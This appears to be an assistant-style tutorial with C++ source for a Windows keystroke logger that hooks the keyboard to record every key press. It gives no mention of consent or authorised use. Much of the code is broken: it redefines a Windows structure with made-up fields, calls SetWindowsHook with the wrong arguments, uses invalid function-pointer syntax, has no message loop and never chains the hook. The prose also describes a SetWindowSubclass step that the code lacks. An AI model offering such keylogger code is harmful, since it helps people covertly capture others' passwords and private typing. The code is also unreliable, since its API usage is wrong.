To create a keystroke logger on a Windows computer, you can use the Windows API to set up a keyboard hook. This allows your program to monitor and record every key press. Below is a step-by-step guide and the corresponding code:

### Step-by-Step Explanation:

1. **Include Necessary Headers**: You need to include the Windows header files `windows.h` and `winuser.h` for the required functions and structures.

2. **Define the Hook Function**: Create a function `keyboardHookProc` that will handle key events. This function will be called for each key press and release.

3. **Set Up the Window**: Create a window using `CreateWindowEx` and set it as the owner of the keyboard hook using `SetWindowSubclass`.

4. **Install the Keyboard Hook**: Use `SetWindowsHook` to install the hook with the `keyboardHookProc` function. This will allow your program to receive keyboard events.

5. **Handle Key Events**: In the `keyboardHookProc` function, check if the event is a key press or release and collect the keystroke data.

6. **Collect Keystrokes**: Store the keystrokes in a list or send them to a file for logging.

7. **Uninstall the Hook**: Once done with the hook, use `UnhookWindowsHook` to remove it to prevent it from running unnecessarily.

### Code Example:

```c++
#include <windows.h>
#include <winuser.h>
#include <iostream>
#include <vector>

using namespace std;

// Define the structure for KBDLLHOOKSTRUCT
typedef struct _KBDLLHOOKSTRUCT {
    uint32_t size;
    uint32_t hook;
    HWND targetHandle;
    uint32_t id;
    uint32_t state;
    uint32_t keyboardData;
} KBDLLHOOKSTRUCT, *PKBDLLHOOKSTRUCT;

// Function prototype for the hook
void CALLBACK keyboardHookProc(int nCode, int wParam, int lParam);

// Function to handle keyboard events
void CALLBACK keyboardHookProc(int nCode, int wParam, int lParam) {
    if (nCode != HC_ACTION) {
        return;
    }

    KBDLLHOOKSTRUCT *pKb = (PKBDLLHOOKSTRUCT *)lParam;

    if (wParam == WM_KEYDOWN) {
        // Key pressed
        cout << "Key down: ";
        if (pKb->state & 0x01) {
            // Check if the key is a letter and adjust case based on Shift or Ctrl
            if (pKb->keyboardData == 'A' || pKb->keyboardData == 'B' || pKb->keyboardData == 'C' || pKb->keyboardData == 'D' || pKb->keyboardData == 'E' || pKb->keyboardData == 'F' || pKb->keyboardData == 'G' || pKb->keyboardData == 'H' || pKb->keyboardData == 'I' || pKb->keyboardData == 'J' || pKb->keyboardData == 'K' || pKb->keyboardData == 'L' || pKb->keyboardData == 'N' || pKb->keyboardData == 'M' || pKb->keyboardData == 'O' || pKb->keyboardData == 'P' || pKb->keyboardData == 'Q' || pKb->keyboardData == 'R' || pKb->keyboardData == 'S' || pKb->keyboardData == 'T' || pKb->keyboardData == 'U' || pKb->keyboardData == 'V' || pKb->keyboardData == 'W' || pKb->keyboardData == 'X' || pKb->keyboardData == 'Y' || pKb->keyboardData == 'Z' || pKb->keyboardData == '1' || pKb->keyboardData == '2' || pKb->keyboardData == '3' || pKb->keyboardData == '4' || pKb->keyboardData == '5' || pKb->keyboardData == '6' || pKb->keyboardData == '7' || pKb->keyboardData == '8' || pKb->keyboardData == '9' || pKb->keyboardData == '0' || pKb->keyboardData == '-' || pKb->keyboardData == '=' || pKb->keyboardData == '[' || pKb->keyboardData == ']' || pKb->keyboardData == '\\') {
                cout << (char)tolower((unsigned char)pKb->keyboardData) << " (0x" << hex << pKb->keyboardData << ")" << endl;
            } else {
                cout << (char)toupper((unsigned char)pKb->keyboardData) << " (0x" << hex << pKb->keyboardData << ")" << endl;
            }
        }
    } else if (wParam == WM_KEYUP) {
        // Key released
        cout << "Key up: " << (char)pKb->keyboardData << " (0x" << hex << pKb->keyboardData << ")" << endl;
    }
}

int main() {
    HWND hwnd = GetDesktopWindow();
    HHOOK hhook = 0;

    // Define the hook function
    keyboardHookProc *pfn = keyboardHookProc;

    // Install the hook
    hhook = SetWindowsHook(hwnd, WH_KEYBOARD_LL, pfn);

    if (hhook == 0) {
        cerr << "Failed to install keyboard hook." << endl;
        return 1;
    }

    // Keep the hook active
    while (true) {
        Sleep(1);
    }

    // Uninstall the hook
    UnhookWindowsHook(hhook);
    return 0;
}
```

### Explanation:

- **Headers Included**: The necessary Windows API headers are included to access functions and structures related to hooks and keyboard input.
- **KeyboardHookProc Function**: This function is called for each key press and release. It checks if the event is a key down or up and processes the keystroke accordingly.
- **Setting Up the Window**: The `SetWindowSubclass` function is used to attach the hook to the desktop window.
- **Installing the Hook**: The `SetWindowsHook` function is used to install the hook, which allows the program to receive keyboard events.
- **Handling Keystrokes**: The function checks if the key is pressed or released and logs the keystroke to the console.
- **Uninstalling the Hook**: After the program exits, the hook is uninstalled to prevent it from running unnecessarily.

